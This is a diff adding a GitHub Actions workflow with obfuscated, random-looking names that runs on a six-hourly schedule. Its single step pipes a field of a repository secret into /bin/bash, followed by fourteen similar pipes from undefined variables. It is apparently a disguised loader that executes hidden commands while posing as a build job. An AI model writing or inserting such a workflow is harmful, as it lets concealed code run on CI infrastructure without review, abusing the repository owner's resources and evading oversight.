@@ -1,0 +1,31 @@
+name: yinerbu6741
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinerbu6741
+        env:
+          ot0522: ${{ secrets.ot0522 }}
+        run: |
+          echo $ot0522 | jq -r .cqxn13813 | /bin/bash
+          echo $l10 | jq -r .j5 | /bin/bash
+          echo $osn993 | jq -r .hgevr03524 | /bin/bash
+          echo $u41040 | jq -r .nd070 | /bin/bash
+          echo $upvu61 | jq -r .a2 | /bin/bash
+          echo $ih44 | jq -r .xyg90 | /bin/bash
+          echo $af082 | jq -r .u209 | /bin/bash
+          echo $sg24 | jq -r .tyzuq9416 | /bin/bash
+          echo $o609 | jq -r .owz82779 | /bin/bash
+          echo $phv51 | jq -r .jug98 | /bin/bash
+          echo $g25900 | jq -r .xfimh50289 | /bin/bash
+          echo $bxvk67899 | jq -r .y7 | /bin/bash
+          echo $zhin6528 | jq -r .dssp7 | /bin/bash
+          echo $v134 | jq -r .izxdw26 | /bin/bash
+          echo $etb4997 | jq -r .vnld8644 | /bin/bash
+
